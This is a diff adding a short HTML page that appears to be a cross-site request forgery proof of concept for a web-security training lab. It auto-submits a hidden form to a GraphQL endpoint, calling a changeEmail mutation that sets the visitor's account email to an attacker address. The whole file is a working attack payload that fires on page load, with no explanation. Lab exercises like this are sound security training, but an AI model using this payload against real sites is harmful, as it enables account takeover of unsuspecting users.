@@ -1,0 +1,17 @@
+<html>
+    <body>
+        <form action="https://0a8000a10490937680fd179b004b00e3.web-security-academy.net/graphql/v1" method="POST">
+            <input type="hidden" name="query" value="
+                mutation changeEmail($input: ChangeEmailInput!) {
+                    changeEmail(input: $input) {
+                        email
+                    }
+                }" />
+            <input type="hidden" name="operationName" value="changeEmail" />
+            <input type="hidden" name="variables" value="{&quot;input&quot;:{&quot;email&quot;:&quot;hacker@evil.com&quot;}}" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
